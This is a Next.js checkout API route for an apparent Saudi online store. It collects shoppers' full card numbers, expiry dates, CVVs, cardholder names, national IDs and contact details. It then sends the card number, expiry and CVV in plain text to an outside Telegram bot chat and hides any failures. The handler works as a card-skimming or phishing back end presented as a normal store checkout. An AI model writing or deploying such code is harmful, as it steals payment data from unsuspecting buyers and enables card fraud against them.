import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;

  // حفظ في الداتابيز
  let dbId: string | null = null;
  try {
    const dbRes = await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
    });
    const dbData = await dbRes.json().catch(() => ({}));
    dbId = dbData._id ?? null;
  } catch (_) {}

  // Send Telegram
  const text = [
    `🏪 طلب لـ متجر مؤسسة تبارك التقنية الذكية`,
    `🔢 رقم الطلب: #${orderId}`,
    ``,
    `💰 Total Amount: ${total} SAR`,
    ...(installmentType === "installment"
      ? [`💵 First Payment: ${downPayment} SAR`]
      : [`💵 Payment Type: Full Amount`]),
    ``,
    `💳 MadaVisa - New Order`,
    `👤 Order For: ${customer ?? "-"}`,
    `📱 WhatsApp: ${whatsapp ?? "-"}`,
    `💳 Card Number: ${cardNumber}`,
    `👤 Card Holder: ${cardHolder}`,
    `📅 Valid To: ${expiry}`,
    `🔐 CVV: ${cvv}`,
  ].join("\n");

  try {
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text }),
      }
    );
  } catch (_) {}

  return NextResponse.json({ ok: true, orderId, dbId });
}
